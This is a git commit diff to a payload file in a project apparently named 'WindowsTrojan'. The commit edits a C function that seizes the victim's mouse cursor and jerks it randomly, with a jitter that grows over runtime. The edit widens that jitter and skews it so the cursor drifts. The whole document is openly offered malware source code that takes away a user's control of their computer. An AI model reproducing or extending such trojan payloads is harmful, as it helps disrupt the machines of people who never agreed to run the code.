476c0221d48551ace38fe59335ba75a3fc1046a6
SkyrisBactera <davis.davalos.delosh@gmail.com>
2017-05-19 13:13:36 -0600

    Update PayloadCursor.c

--- WindowsTrojan/Source/Payloads/PayloadCursor.c
+++ WindowsTrojan/Source/Payloads/PayloadCursor.c
@@ -6,7 +6,7 @@ PAYLOADFUNCTIONDEFAULT(payloadCursor) {
 	POINT cursor;
 	GetCursorPos(&cursor);
 
-	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));
+	SetCursorPos(cursor.x + (random() % 7 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 7 - 1) * (random() % (runtime / 2200 + 2)));
 
 	out: return 2;
 }
